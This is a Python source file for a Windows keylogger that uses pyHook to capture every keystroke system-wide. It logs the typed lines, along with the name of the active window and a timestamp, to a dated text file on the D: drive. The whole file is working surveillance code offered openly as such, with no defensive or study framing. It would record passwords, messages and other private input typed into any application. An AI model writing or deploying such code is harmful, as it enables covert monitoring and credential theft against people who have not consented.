import pyHook, sys, pythoncom, logging
from datetime import datetime

todays_date = datetime.now().strftime('%Y-%b-%d')
file_name = 'D:\\kl\\log\\' + todays_date + '.txt'

line_buffer = "" #current typed line before return character
window_name = "" #current window

def SaveLineToFile(line):
    current_time = datetime.now().strftime('%H:%M:%S')
    line = "[" + current_time + "] " + line
    todays_file = open(file_name, 'a') #open todays file (append mode)
    todays_file.write(line) #append line to file
    todays_file.close() #close todays file

def OnKeyboardEvent(event):
    global line_buffer
    global window_name

    #print 'Ascii:', event.Ascii, chr(event.Ascii) 

    
    if(window_name != event.WindowName): #typing innew window
        if(line_buffer != ""): #if line buffer is not empty
            line_buffer += '\n'
            SaveLineToFile(line_buffer) #print to file: any non printed characters from old window

        line_buffer = "" #clear the line buffer
        SaveLineToFile('\n-----WindowName: ' + event.WindowName + '\n') #print to file: the new window name
        window_name = event.WindowName #set the new window name

    
    if(event.Ascii == 13 or event.Ascii == 9): #enter key
        line_buffer += '\n'
        SaveLineToFile(line_buffer) #print to file: the line buffer
        line_buffer = "" #clear the line buffer
        return True #exit event

   
    if(event.Ascii == 8): #backspace key
        line_buffer = line_buffer[:-1] #removelast character
        return True #exit event

    
    if(event.Ascii < 32 or event.Ascii > 126):
        if(event.Ascii == 0): #unknown character 
            pass 
        else:
            line_buffer = line_buffer + '\n' + str(event.Ascii) + '\n'
    else:
        line_buffer += chr(event.Ascii) #add char 
        
    return True #pass event to other handlers
	

hooks_manager = pyHook.HookManager() 
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard() 
pythoncom.PumpMessages() 
